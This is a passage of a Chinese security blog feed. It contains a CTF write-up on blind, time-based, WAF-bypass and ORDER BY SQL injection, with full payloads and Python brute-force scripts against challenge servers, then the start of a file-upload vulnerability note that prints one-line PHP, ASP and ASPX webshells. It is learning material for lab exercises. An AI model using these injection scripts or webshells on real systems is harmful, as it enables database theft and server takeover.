href="http://qwzf.github.io/2019/07/19/sqli-labs攻关2(布尔盲注、时间盲注)/">sqli-labs攻关2(布尔盲注、时间盲注)</a></li><li>一般：可以使用Burpsuite抓包，半自动化盲注，设置变量，通过返回的长度不同进行判断<br>参考：<br><a href="http://www.cnblogs.com/xiaozi/p/10782330.html" target="_blank" rel="noopener">利用BurpSuite实现半自动化盲注</a></li><li>较快：写一个普通盲注脚本进行盲注<br>参考：<br><a href="http://www.e-learn.cn/content/qita/817284" target="_blank" rel="noopener">sqli-labs盲注脚本</a><br><a href="http://www.jianshu.com/p/acb770d6def2" target="_blank" rel="noopener">python3以post方式提交数据</a><ol start="4"><li>最快:写一个2分法猜测数据库长度的盲注脚本进行盲注<br>参考：<br><a href="http://www.jianshu.com/p/45076518789b" target="_blank" rel="noopener">Bool盲注脚本-POST</a></li></ol></li></ol><p><strong>1.爆库</strong><br><em>猜库长</em><br>payload</p><pre><code class="sql">&quot; or (length(database())=10)--+正常</code></pre><p>所以数据库长度为10<br><em>猜库名</em><br>payload</p><pre><code class="sql">&quot; or (ascii(substr(database(),1,1))=n)--+</code></pre><h4 id="手工盲注"><a href="#手工盲注" class="headerlink" title="手工盲注"></a>手工盲注</h4><p>手工测试第一个字符<br><img src="http://img-blog.csdnimg.cn/20190801180720343.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190801180730383.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个字符ascii码为99，即字符“c”<br>一直尝试，直到字符全部猜出。</p><h4 id="Burpsuite半自动化盲注"><a href="#Burpsuite半自动化盲注" class="headerlink" title="Burpsuite半自动化盲注"></a>Burpsuite半自动化盲注</h4><p>要注意如果第二个变量选择的是字符字典，payload写成如下形式：</p><pre><code class="sql">&quot; or (substr(database(),1,1)=&#39;a&#39;)--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801184341945.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190801184504288.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190801184558291.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190801184517113.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>length为498的即为正常回显的，(上面等进度条满格则爆破结束，我没有爆破完)将得到的正常回显的Payload2根据Payload1进行排序，即为数据库名。数据库名为<code>chellenges</code><br><strong>2.爆表</strong><br><em>猜表长</em><br>payload</p><pre><code class="sql">&quot; or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6)--+正常</code></pre><p>所以数据表长度为6<br><em>猜表名</em><br>payload</p><pre><code class="sql">&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=n)--+</code></pre><p>沿用爆库的方法，最终得到表名<code>user_2</code><br><strong>3.爆字段</strong><br><em>猜字段长</em><br>payload</p><pre><code class="sql">&quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1))=2)--+正常</code></pre><pre><code class="sql">&quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1))=8)--+正常</code></pre><pre><code class="sql">&quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 2,1))=8)--+正常</code></pre><p>所以数据字段长度分别为2、8、8<br><em>猜字段名</em><br>payload</p><pre><code class="sql">&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))=n)--+</code></pre><p>沿用爆库的方法，最终得到三个字段名<code>id</code> <code>username</code> <code>password</code><br><strong>4.爆数据</strong><br><em>猜数据长</em></p><pre><code class="sql">&quot; or (length((select password from challenges.user_2 limit 1,1))=32)--+正常</code></pre><p>所以数据长度为32，这个应该就是flag那条数据了<br><em>猜数据名</em></p><pre><code class="sql">&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))=n)--+</code></pre><p>沿用爆库的方法，最终得到数据flag</p><h4 id="脚本盲注"><a href="#脚本盲注" class="headerlink" title="脚本盲注"></a>脚本盲注</h4><p>这里有一个我参照大佬博客写好的脚本(我太菜，不会写二分法猜长度的那个脚本)</p><pre><code class="python">import requestschars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39;postdata={    &#39;username&#39;:&#39;&quot; or 1=1#&#39;,    &#39;password&#39;:&#39;admin&#39;    }url=&quot;http://35.201.188.231:9000/challenge-02/post.php&quot;r=requests.post(url,data=postdata)length=len(r.text)def name(url,length):    dbname=&#39;&#39;    print(&quot;数据库名：&quot;,dbname)    payload=&#39;&quot; or ascii(substr(database(),{0},1))={1} #&#39;    #print(&quot;数据表名：&quot;,dbname)    #payload=&#39;&quot;or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}#&#39;    #print(&quot;字段名：&quot;,dbname)    #payload=&#39;&quot;or ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1),{0},1))={1}#&#39;    #print(&quot;数据：&quot;,dbname)    #payload=&#39;&quot; or ascii(substr((select password from user_2 limit 1,1),{0},1))={1}#&#39;    for i in range(1,40):        char=&#39;&#39;        for x in chars:            char_ascii=ord(x)            payloads=payload.format(i,char_ascii)            postdata={            &#39;username&#39;:payloads,            &#39;password&#39;:&#39;admin&#39;            }            r=requests.post(url,data=postdata)            if len(r.text) == length:                dbname+=x                print(dbname)                char=x                break        if char==&#39;&#39;:            break    return dbnamename(url,length)</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801205026856.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web3：BASE-TIME-BLIND-INJECT"><a href="#Web3：BASE-TIME-BLIND-INJECT" class="headerlink" title="Web3：BASE-TIME-BLIND-INJECT"></a>Web3：BASE-TIME-BLIND-INJECT</h3><p><img src="http://img-blog.csdnimg.cn/20190801194522570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目意思是时间盲注，所以很显然这道题是时间盲注。时间盲注正常和不正常回显结果相同，所以进入题目，还是登录框，先不测试。查看源码<br><img src="http://img-blog.csdnimg.cn/20190801195034445.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>给了题目源码，url框输入<a href="http://www.zip下载源码，或如下" target="_blank" rel="noopener">www.zip下载源码，或如下</a><br><img src="http://img-blog.csdnimg.cn/20190801195519107.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压，查看<br><img src="http://img-blog.csdnimg.cn/20190801200424454.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现sql查询语句的闭合方式，所以构造闭合方式为<code>&#39;&quot;</code><br>当然时间盲注也有三种方法：</p><ol><li>手工盲注： <a href="http://qwzf.github.io/2019/07/19/sqli-labs攻关2(布尔盲注、时间盲注)/">sqli-labs攻关2(布尔盲注、时间盲注)</a></li><li>Burpsuite半自动化盲注：<a href="http://www.sohu.com/a/319100397_609556" target="_blank" rel="noopener">Mysql 高级盲注技巧之时间盲注</a></li><li>脚本盲注：<a href="http://www.jianshu.com/p/580731f569f4" target="_blank" rel="noopener">Time盲注脚本-POST</a></li></ol><p>与布尔盲注相比，因为正常和不正常返回相同，所以采用sleep()函数延迟时间来判断是否正常。<br><strong>1.爆库</strong><br><em>猜库长</em></p><pre><code class="sql">&#39;&quot; or if(length(database())=10,sleep(5),1)--+延迟五秒</code></pre><p>所以数据库长度为10<br><em>猜库名</em></p><pre><code class="sql">&#39;&quot; or if((ascii(substr(database(),1,1))=n),sleep(5),1)--+</code></pre><h4 id="手工盲注-1"><a href="#手工盲注-1" class="headerlink" title="手工盲注"></a>手工盲注</h4><p>手工测试第一个字符<br><img src="http://img-blog.csdnimg.cn/2019080123162812.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190801231449841.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个字符ascii码为98时，无延迟；第一个字符ascii码为99时，延迟5秒。所以第一个字符为99，即字符“c”</p><h4 id="Burpsuite半自动化盲注-1"><a href="#Burpsuite半自动化盲注-1" class="headerlink" title="Burpsuite半自动化盲注"></a>Burpsuite半自动化盲注</h4><p>要注意如果第二个变量选择的是字符字典，大小写识别有点问题，不过因为字典较快，所以依旧用的字典，然后再判断大小写。payload写成如下形式：</p><pre><code class="sql">&#39;&quot; or if((substr(database(),1,1)=&#39;a&#39;),sleep(5),1)--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801224221248.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>和布尔盲注一样选择设置变量，选择变量范围。开始爆破，双击Timeout下的四方块<br><img src="http://img-blog.csdnimg.cn/2019080122433832.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>正常的<br><img src="http://img-blog.csdnimg.cn/20190801230253124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>延迟的<br><img src="http://img-blog.csdnimg.cn/20190801230311380.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到所有延迟的，然后进行排序即可得到数据库名。最后得到数据库名为<code>chellenges</code><br><strong>2.爆表</strong><br><em>猜表长</em></p><pre><code class="sql">&#39;&quot; or if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6),sleep(5),1)--+延迟5秒</code></pre><p>所以数据表长度为6<br><em>猜表名</em></p><pre><code class="sql">&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=n),sleep(5),1)--+</code></pre><p>沿用爆库的方法，最终得到表名<code>user_3</code><br><strong>3.爆字段</strong><br><em>猜字段长</em></p><pre><code class="sql">&#39;\&quot; or if((length((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 0,1))=2),sleep(5),1)--+延迟5秒</code></pre><pre><code class="sql">&#39;\&quot; or if((length((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 1,1))=8),sleep(5),1)--+延迟5秒</code></pre><pre><code class="sql">&#39;\&quot; or if((length((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 2,1))=8),sleep(5),1)--+延迟5秒</code></pre><p>所以数据字段长度分别为2、8、8<br><em>猜字段名</em></p><pre><code class="sql">&#39;\&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 0,1),1,1))=n),sleep(5),1)--+</code></pre><p>沿用爆库的方法，最终得到三个字段名<code>id</code> <code>username</code> <code>password</code><br><strong>4.爆数据</strong><br> <em>猜数据长</em></p><pre><code class="sql">&quot; or if((length((select password from challenges.user_3 limit 1,1))=25),sleep(5),1)--+延迟5秒</code></pre><p>所以数据长度为25，这个应该就是flag那条数据了<br> <em>猜数据名</em></p><pre><code class="sql">&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))=n),1,sleep(5))--+</code></pre><p>沿用爆库的方法，最终得到数据flag</p><h4 id="脚本盲注-1"><a href="#脚本盲注-1" class="headerlink" title="脚本盲注"></a>脚本盲注</h4><p>这里有一个我修改布尔盲注得到的时间盲注脚本</p><pre><code class="python">import requestsimport timeimport stringimport syschars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39;url=&quot;http://35.201.188.231:9000/challenge-02/post.php&quot;dbname=&#39;&#39;payload=&quot;&#39;\&quot; or if((ascii(substr(database(),{0},1))={1}),sleep(5),1) #&quot;print(&quot;数据库名：&quot;,dbname)#payload=&quot;&#39;\&quot;or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}),sleep(5),1) #&quot;#print(&quot;数据表名：&quot;,dbname)#payload=&quot;&#39;\&quot;or if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;user_3&quot; limit 1,1),{0},1))={1}),sleep(5),1) #&quot;#print(&quot;字段名：&quot;,dbname)#payload=&quot;&#39;\&quot; or if((ascii(substr((select password from user_3 limit 1,1),{0},1))={1}),sleep(5),1) #&quot;#print(&quot;数据：&quot;,dbname)for i in range(1,40):    char=&#39;&#39;    for x in chars:        char_ascii=ord(x)        payloads=payload.format(i,char_ascii)        start=time.time()        postdata={            &#39;username&#39;:payloads,            &#39;password&#39;:&#39;admin&#39;        }        r=requests.post(url,data=postdata)        if (time.time() - start)&gt;=5:            dbname+=x            print(dbname)            char=x            break    if char==&#39;&#39;:        break</code></pre><p>因为效率有点低，就先演示个爆数据库名的<br><img src="http://img-blog.csdnimg.cn/20190801235912161.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web4：BASE-INJECT-WAF"><a href="#Web4：BASE-INJECT-WAF" class="headerlink" title="Web4：BASE-INJECT-WAF"></a>Web4：BASE-INJECT-WAF</h3><p><img src="http://img-blog.csdnimg.cn/20190802000233843.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据和查看题目，与Web1相比就多加了个waf。通过<a href="http://www.runoob.com/php/php-preg_replace.html" target="_blank" rel="noopener">preg_replace()函数</a>执行一个正则表达式的搜索和替换。<br>由题目可知，过滤了<code>or|and|select|union|from</code>，所以要进行WAF绕过</p><h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><p>参考博客：<a href="http://www.cnblogs.com/qingwuyou/p/10687462.html" target="_blank" rel="noopener">SQL注入WAF绕过姿势</a><br>这道题我采用的双写绕过<br><strong>1.爆库</strong><br><img src="http://img-blog.csdnimg.cn/20190802001442736.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.爆表</strong><br><img src="http://img-blog.csdnimg.cn/20190802001455549.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.爆字段</strong><br><img src="http://img-blog.csdnimg.cn/20190802001511935.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4.爆数据</strong><br><img src="http://img-blog.csdnimg.cn/20190802001607264.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="Web5：orderby死亡在线"><a href="#Web5：orderby死亡在线" class="headerlink" title="Web5：orderby死亡在线"></a>Web5：orderby死亡在线</h3><p><img src="http://img-blog.csdnimg.cn/20190802001751349.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>order by？！我只知道查列数有用到order by。先看看老学长给的tips<br><img src="http://img-blog.csdnimg.cn/20190802003127538.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先百度一下<code>order by</code><br><a href="http://www.runoob.com/sql/sql-orderby.html" target="_blank" rel="noopener">ORDER BY 关键字</a></p><h4 id="order-by排序注入"><a href="#order-by排序注入" class="headerlink" title="order by排序注入"></a>order by排序注入</h4><p><a href="http://www.jianshu.com/p/fcae21926e5c" target="_blank" rel="noopener">Order by排序注入方法小总结</a><br><a href="http://www.secpulse.com/archives/57197.html" target="_blank" rel="noopener">MySQL Order By 注入总结</a><br>了解完毕。这是order by排序注入，如下order参数可控：</p><pre><code class="sql">select * from goods order by $_GET[&#39;order&#39;]</code></pre><p>而题目tips刚好符合：</p><pre><code class="sql">select * from 一个不是flag的表 order by id {$order}</code></pre><p>我选择利用<strong>报错返回多条记录</strong>的方式进行注入，先进行测试<br>post传参</p><pre><code class="sql">order=and if(1=1,1,(select 1 from information_schema.tables))正确order=and if(1=2,1,(select 1 from information_schema.tables))错误</code></pre><p>所以构造payload开始报错盲注<br><strong>1.爆库</strong><br>payload</p><pre><code class="sql">and if(ascii(substr(database(),1,1))=n,1,(select 1 from information_schema.tables))</code></pre><p><strong>2.爆表</strong><br>payload</p><pre><code class="sql">and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=n,1,(select 1 from information_schema.tables))</code></pre><p><strong>3.爆字段</strong><br>payload</p><pre><code class="sql">and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;cha1users&#39; and table_schema=&#39;cha1DB&#39; limit 3,1),1,1))=n,1,(select 1 from information_schema.tables))</code></pre><p><strong>4.爆数据</strong><br>payload</p><pre><code class="sql">and if(ascii(substr((select flag from cha1users limit 1,1),1,1))=n,1,(select 1 from information_schema.tables))</code></pre><p>除payload不同外，方法沿用布尔盲注。这有一个我改好的脚本：</p><pre><code class="python">import requestschars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+!@%^*$()[]:&quot;.#&#39;postdata={    &#39;order&#39;:&#39;,if(1=1,1,(select 1 from information_schema.tables))&#39;    }url=&quot;http://39.106.19.10/orderby/&quot;r=requests.post(url,data=postdata)length=len(r.text)def name(url,length):    dbname=&#39;&#39;    payload=&#39;and if(ascii(substr(database(),{0},1))={1},1,(select 1 from information_schema.tables))&#39;    print(&quot;数据库为：&quot;,dbname)    #payload=&#39;and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1},1,(select 1 from information_schema.tables))&#39;    #print(&quot;数据表为：&quot;,dbname)    #payload=&quot;and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;cha1users&#39; and table_schema=&#39;cha1DB&#39; limit 3,1),{0},1))={1},1,(select 1 from information_schema.tables))&quot;    #print(&quot;字段为：&quot;,dbname)    #payload=&quot;and if(ascii(substr((select flag from cha1users limit 1,1),{0},1))={1},1,(select 1 from information_schema.tables))&quot;    #print(&quot;数据：&quot;,dbname)    for i in range(1,40):        char=&#39;&#39;        for x in chars:            char_ascii=ord(x)            payloads=payload.format(i,char_ascii)            postdata={            &#39;order&#39;:payloads            }            r=requests.post(url,data=postdata)            if len(r.text) == length:                dbname+=x                print(dbname)                char=x                break        if char==&#39;&#39;:            break    return dbnamename(url,length)</code></pre><h3 id="Reverse1：RE0-签到"><a href="#Reverse1：RE0-签到" class="headerlink" title="Reverse1：RE0(签到)"></a>Reverse1：RE0(签到)</h3><p><img src="http://img-blog.csdnimg.cn/20190802105755603.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就是一个很简单的签到题，赢了就有flag？！所以用IDA打开，选择<br><img src="http://img-blog.csdnimg.cn/20190802110300724.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开得到flag<br><img src="http://img-blog.csdnimg.cn/20190802110417483.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Reverse2：RE1"><a href="#Reverse2：RE1" class="headerlink" title="Reverse2：RE1"></a>Reverse2：RE1</h3><p><img src="http://img-blog.csdnimg.cn/20190802110530103.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示的很明显(之前好像没提示有莫名奇妙的数字)，下载题目用IDA打开，F5反编译一下<br><img src="http://img-blog.csdnimg.cn/20190802111139931.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现一串奇怪的数字，按照v4-v23对下面的数字进行排序，然后转换成ASCII(之前我不知道可以用r键转，所以用的在线平台)<br><img src="http://img-blog.csdnimg.cn/20190802111508684.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>总结之后对联合查询和盲注有了更加清醒的认识，同时会脚本的编写和改写也特别重要。<br>继续努力，小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Reverse </tag>
            
            <tag> SQL </tag>
            
            <tag> 盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞 学习笔记(一)</title>
      <link href="/2019/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/"/>
      <url>/2019/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习进行时，最近我学习了文件上传漏洞，感觉收获很大，所以总结一下。</p><h4 id="为什么存在文件上传漏洞"><a href="#为什么存在文件上传漏洞" class="headerlink" title="为什么存在文件上传漏洞"></a>为什么存在文件上传漏洞</h4><p>上传文件时，Web应用程序没有对上传文件的格式进行严格过滤 , 就容易造成可以上传任意文件的情况。还有一部分是攻击者通过 Web服务器的解析漏洞来突破Web应用程序的防护。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞，攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器，这个恶意脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门。WebShell具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><h4 id="文件上传漏洞环境"><a href="#文件上传漏洞环境" class="headerlink" title="文件上传漏洞环境"></a>文件上传漏洞环境</h4><p>upload-labs：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a><br>皮卡丘：<a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>DoraBox：<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>为了方便，我直接把漏洞环境部署到ubantu虚拟机了。</p><h4 id="一、任意文件上传"><a href="#一、任意文件上传" class="headerlink" title="一、任意文件上传"></a>一、任意文件上传</h4><h5 id="DoraBox漏洞环境"><a href="#DoraBox漏洞环境" class="headerlink" title="DoraBox漏洞环境"></a>DoraBox漏洞环境</h5><p>没有进行任何过滤，可以上传任意文件<br><img src="http://img-blog.csdnimg.cn/20190731120933725.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以直接上传webshell(当然webshell有asp、aspx、php类型。我使用的是php)<br><strong>asp</strong></p><pre><code class="js">&lt;%eval request(“xxx”)%&gt;</code></pre><p><strong>aspx</strong></p><pre><code class="js">&lt;%@ Page Languag=”xxx”%&gt;&lt;%eval(Request.Item[“xxx”])%&gt;</code></pre><p><strong>php</strong></p><pre><code class="php">&lt;?php @eval($_POST[&#39;a&#39;]) ?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190731115327306.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用菜刀或蚁剑连一下，我用的蚁剑<br><img src="http://img-blog.csdnimg.cn/20190731120002901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以查看服务器文件和目录了<br><img src="http://img-blog.csdnimg.cn/20190731120251235.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" 